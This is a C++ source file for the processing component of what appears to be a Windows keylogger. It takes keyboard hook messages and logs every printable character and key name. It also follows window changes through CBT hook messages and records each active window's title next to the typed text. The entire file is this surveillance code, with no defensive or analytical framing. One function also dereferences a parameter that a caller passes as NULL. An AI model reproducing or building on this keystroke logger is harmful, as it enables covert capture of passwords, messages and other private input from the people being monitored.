#include "../inc/Processing.h"

static const int KEY_BUFFER_SIZE = 0x100;
static const int TITLE_BUFFER_SIZE = 0x100;

CProcessing::CProcessing() : m_Logger(NULL), m_LastWriteHWND(NULL), m_CurrentHWND(NULL), m_Title(NULL), m_BackupTitle(NULL), m_LastWriteTitle(NULL), m_KeyNameBuffer(NULL), m_NeedWriteTitle(FALSE)
{
	m_Logger = new CLogger();

	m_Title = new WCHAR[TITLE_BUFFER_SIZE];
	m_Title[0] = NULL;
	m_BackupTitle = new WCHAR[TITLE_BUFFER_SIZE];
	m_BackupTitle[0] = NULL;
	m_LastWriteTitle = new WCHAR[TITLE_BUFFER_SIZE];
	m_LastWriteTitle[0] = NULL;
	m_KeyNameBuffer = new WCHAR[KEY_BUFFER_SIZE];
	m_KeyNameBuffer[0] = NULL;
}

CProcessing::~CProcessing()
{
	Delete(&m_Logger);
	DeleteArr(&m_Title);
	DeleteArr(&m_BackupTitle);	
	DeleteArr(&m_LastWriteTitle);
	DeleteArr(&m_KeyNameBuffer);
}

BOOL CProcessing::GetTitle(HWND hWnd, PWSTR Title, PWSTR BackupTitle)
{
	if(hWnd == NULL)
		return FALSE;
	int len = GetWindowText(m_CurrentHWND, Title, TITLE_BUFFER_SIZE);
	if((len > 0) || (GetLastError() == ERROR_SUCCESS))
		return TRUE;
	if((m_BackupTitle != NULL) && (BackupTitle[0] != NULL))
	{
		wcscpy_s(Title, TITLE_BUFFER_SIZE, BackupTitle);
		return TRUE;
	}
	return FALSE;
}

BOOL CProcessing::WriteTitle(void)
{
	if(!GetTitle(m_CurrentHWND, m_Title, m_BackupTitle))
	{
		m_LastWriteHWND = NULL;
		m_BackupTitle[0] = NULL;
		m_Logger->WriteTitle(L"NULL Title");
		return FALSE;
	}

	if((m_LastWriteHWND == m_CurrentHWND) && (wcscmp(m_Title, m_LastWriteTitle) == 0))
		return TRUE;

	if(m_Logger->WriteTitle(m_Title))
	{
		m_LastWriteHWND = m_CurrentHWND;
		wcscpy_s(m_LastWriteTitle, TITLE_BUFFER_SIZE, m_Title);
		return TRUE;
	}else
	{
		m_LastWriteHWND = NULL;
		m_LastWriteTitle[0] = NULL;
		return FALSE;
	}
}

void CProcessing::SaveKeyboadMsg(WPARAM wParam, LPARAM lParam)
{
	if(m_NeedWriteTitle)
	{		
		WriteTitle();
		m_NeedWriteTitle = FALSE;
	}

	WCHAR ch = static_cast<WCHAR>(wParam);
	if(iswprint(ch) || iswspace(ch))
	{
		m_Logger->WriteSymbol(ch);
		if ((ch == L'\n') || (ch == L'\r'))
			m_NeedWriteTitle = TRUE;
		return;
	}
	
	if(GetKeyNameText(lParam, m_KeyNameBuffer, KEY_BUFFER_SIZE) != 0)
		m_Logger->WriteKeyName(m_KeyNameBuffer);
}

void CProcessing::SaveCBTMsg(WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	m_CurrentHWND = reinterpret_cast<HWND>(wParam);
	if(!GetTitle(m_CurrentHWND, m_BackupTitle, NULL))
		m_BackupTitle[0] = NULL;
	m_NeedWriteTitle = TRUE;
}
